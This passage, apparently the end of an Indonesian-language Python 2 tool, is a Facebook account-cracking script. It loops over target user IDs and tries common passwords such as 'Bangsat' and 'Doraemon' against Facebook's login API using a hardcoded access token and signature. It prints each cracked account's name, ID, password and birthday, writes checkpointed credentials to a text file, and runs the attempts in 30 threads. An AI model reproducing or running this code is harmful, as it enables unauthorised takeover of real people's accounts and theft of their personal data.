																						print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
																						print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
																						print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass9 + '\n'
																						print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
																						cek = open("out/super_cp.txt", "a")
																						cek.write("ID:" +user+ " Pw:" +pass9+"\n")
																						cek.close()
																						cekpoint.append(user+pass9)
																					else:
																						pass10 = 'Bangsat'
																						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																						w = json.load(data)
																						if 'access_token' in w:
																							x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																							z = json.loads(x.text)
																							print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
																							print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
																							print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
																							print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass10 + '\n'
																							print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
																							oks.append(user+pass10)
																						else:
																							if 'www.facebook.com' in w['error_msg']:
																								print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
																								print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
																								print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
																								print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass10 + '\n'
																								print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
																								cek = open("out/super_cp.txt", "a")
																								cek.write("ID:" +user+ " Pw:" +pass10+"\n")
																								cek.close()
																								cekpoint.append(user+pass10)
																							else:
																								pass11 = 'Doraemon'
																								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																								w = json.load(data)
																								if 'access_token' in w:
																									x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																									z = json.loads(x.text)
																									print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
																									print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
																									print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
																									print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass11 + '\n'
																									print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
																									oks.append(user+pass11)
																								else:
																									if 'www.facebook.com' in w['error_msg']:
																										print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
																										print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
																										print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
																										print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass11 + '\n'
																										print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
																										cek = open("out/super_cp.txt", "a")
																										cek.write("ID:" +user+ " Pw:" +pass11+"\n")
																										cek.close()
																										cekpoint.append(user+pass11)
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;34m████████████████████████████████████████████████"
	print '\033[1;97m[\033[1;93m✔\033[1;97m] \033[1;97mSelesai ....'
	print"\033[1;97m[\033[1;93m✴\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m[\033[1;93m➹\033[1;97m] \033[1;97mCP file tersimpan : out/ind1.txt'
	print "\033[1;34m████████████████████████████████████████████████"
	raw_input("\033[1;93m[\033[1;97m Kembali \033[1;93m]")
	os.system("python2 Testing.py")
	

	
			
if __name__=='__main__':
        menu()
        masuk()
